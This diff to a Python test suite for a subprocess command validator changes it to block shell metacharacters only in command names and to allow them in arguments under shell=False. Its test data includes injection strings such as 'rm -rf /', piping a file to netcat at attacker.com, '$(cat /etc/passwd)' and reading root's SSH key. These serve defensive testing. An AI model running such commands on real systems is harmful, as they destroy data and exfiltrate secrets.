@@ -1,7 +1,8 @@
 """Tests for subprocess command injection prevention.
 
 These tests verify that the subprocess command validation properly blocks
-all shell metacharacters that could lead to command injection attacks.
+shell metacharacters in the command name while allowing them in arguments
+(since shell=False passes arguments literally without shell interpretation).
 """
 
 from __future__ import annotations
@@ -120,6 +121,11 @@ def test_validate_subprocess_command_non_string_argument_raises() -> None:
         validate_subprocess_command(["ls", 123])  # type: ignore[list-item]
 
 
+# =============================================================================
+# Tests for unsafe characters in COMMAND NAME (should raise)
+# =============================================================================
+
+
 @pytest.mark.parametrize(
     ("char", "description"),
     [
@@ -145,81 +151,110 @@ def test_validate_subprocess_command_non_string_argument_raises() -> None:
         pytest.param("!", "history expansion", id="exclamation"),
     ],
 )
-def test_validate_subprocess_command_unsafe_char_in_argument_raises(
+def test_validate_subprocess_command_unsafe_char_in_command_name_raises(
     char: str,
     description: str,
 ) -> None:
-    """Verify each unsafe character is properly blocked.
+    """Verify each unsafe character in command name is blocked.
 
     Args:
         char: The unsafe character to test.
         description: Human-readable description of the character.
     """
     with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["echo", f"arg{char}value"])
+        validate_subprocess_command([f"cmd{char}name", "arg"])
 
 
-def test_validate_subprocess_command_injection_semicolon() -> None:
-    """Verify semicolon command injection is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["ls", "-la; rm -rf /"])
-
-
-def test_validate_subprocess_command_injection_pipe() -> None:
-    """Verify pipe command injection is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["cat", "file | nc attacker.com 1234"])
-
-
-def test_validate_subprocess_command_injection_backtick() -> None:
-    """Verify backtick command substitution is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["echo", "`whoami`"])
-
-
-def test_validate_subprocess_command_injection_dollar_parens() -> None:
-    """Verify $() command substitution is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["echo", "$(cat /etc/passwd)"])
-
-
-def test_validate_subprocess_command_injection_output_redirect() -> None:
-    """Verify output redirection injection is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["echo", "data > /etc/crontab"])
-
-
-def test_validate_subprocess_command_glob_expansion_attack() -> None:
-    """Verify glob expansion is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["rm", "/tmp/*.txt"])
-
-
-def test_validate_subprocess_command_brace_expansion_attack() -> None:
-    """Verify brace expansion is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["touch", "/tmp/{a,b,c}.txt"])
-
-
-def test_validate_subprocess_command_home_expansion_attack() -> None:
-    """Verify home directory expansion is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["cat", "~root/.ssh/id_rsa"])
-
-
-def test_validate_subprocess_command_newline_injection() -> None:
-    """Verify newline injection is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["echo", "line1\nmalicious"])
-
-
-def test_validate_subprocess_command_unsafe_char_in_command_name_raises() -> None:
-    """Verify unsafe character in command name is blocked."""
+def test_validate_subprocess_command_injection_in_command_name() -> None:
+    """Verify command injection in command name is blocked."""
     with pytest.raises(ValueError, match="Unsafe character"):
         validate_subprocess_command(["ls;rm", "-la"])
 
 
-def test_validate_subprocess_command_multiple_unsafe_chars_raises() -> None:
-    """Verify command with multiple unsafe chars is blocked."""
-    with pytest.raises(ValueError, match="Unsafe character"):
-        validate_subprocess_command(["cmd", "arg; echo $USER | nc"])
+# =============================================================================
+# Tests for unsafe characters in ARGUMENTS (should NOT raise with shell=False)
+# =============================================================================
+
+
+@pytest.mark.parametrize(
+    ("char", "description"),
+    [
+        pytest.param(";", "semicolon command separator", id="semicolon"),
+        pytest.param("&", "ampersand background/AND", id="ampersand"),
+        pytest.param("|", "pipe", id="pipe"),
+        pytest.param(">", "output redirection", id="redirect_out"),
+        pytest.param("<", "input redirection", id="redirect_in"),
+        pytest.param("`", "backtick command substitution", id="backtick"),
+        pytest.param("$", "variable expansion", id="dollar"),
+        pytest.param("\\", "escape character", id="backslash"),
+        pytest.param("*", "glob wildcard", id="asterisk"),
+        pytest.param("?", "single char wildcard", id="question"),
+        pytest.param("[", "character class start", id="bracket_open"),
+        pytest.param("]", "character class end", id="bracket_close"),
+        pytest.param("{", "brace expansion start", id="brace_open"),
+        pytest.param("}", "brace expansion end", id="brace_close"),
+        pytest.param("(", "subshell start", id="paren_open"),
+        pytest.param(")", "subshell end", id="paren_close"),
+        pytest.param("~", "home expansion", id="tilde"),
+        pytest.param("!", "history expansion", id="exclamation"),
+    ],
+)
+def test_validate_subprocess_command_special_char_in_argument_allowed(
+    char: str,
+    description: str,
+) -> None:
+    """Verify special characters in arguments are allowed with shell=False.
+
+    Since lintro always uses shell=False, arguments are passed literally to
+    the subprocess without shell interpretation. This allows legitimate use
+    of special characters in file paths, glob patterns, and tool-specific
+    syntax (e.g., Semgrep metavariables like $X).
+
+    Args:
+        char: The special character to test.
+        description: Human-readable description of the character.
+    """
+    # Should NOT raise - special chars in args are safe with shell=False
+    validate_subprocess_command(["echo", f"arg{char}value"])
+
+
+def test_validate_subprocess_command_glob_pattern_in_argument_allowed() -> None:
+    """Verify glob patterns in arguments are allowed."""
+    # Common use case: passing include/exclude patterns to tools
+    validate_subprocess_command(["semgrep", "--include", "*.py"])
+    validate_subprocess_command(["ruff", "check", "src/**/*.py"])
+
+
+def test_validate_subprocess_command_template_path_allowed() -> None:
+    """Verify template paths with special chars are allowed."""
+    # Common use case: Jinja2 templates, cookiecutter directories
+    validate_subprocess_command(["cat", "templates/{{cookiecutter.name}}/file.py"])
+
+
+def test_validate_subprocess_command_variable_syntax_allowed() -> None:
+    """Verify tool-specific variable syntax is allowed."""
+    # Common use case: Semgrep metavariables
+    validate_subprocess_command(["semgrep", "--pattern", "$X = $Y"])
+
+
+def test_validate_subprocess_command_dollar_in_filename_allowed() -> None:
+    """Verify filenames with $ are allowed."""
+    # Some projects have files with $ in names
+    validate_subprocess_command(["cat", "test_$var.py"])
+
+
+def test_validate_subprocess_command_shell_injection_args_safe_with_shell_false() -> (
+    None
+):
+    """Verify shell injection attempts in args are safe with shell=False.
+
+    These would be dangerous with shell=True, but are harmless with shell=False
+    as the arguments are passed directly to the executable without
+    shell interpretation.
+    """
+    # These look like injection attempts but are safe with shell=False
+    validate_subprocess_command(["ls", "-la; rm -rf /"])
+    validate_subprocess_command(["cat", "file | nc attacker.com 1234"])
+    validate_subprocess_command(["echo", "`whoami`"])
+    validate_subprocess_command(["echo", "$(cat /etc/passwd)"])
+    validate_subprocess_command(["echo", "data > /etc/crontab"])
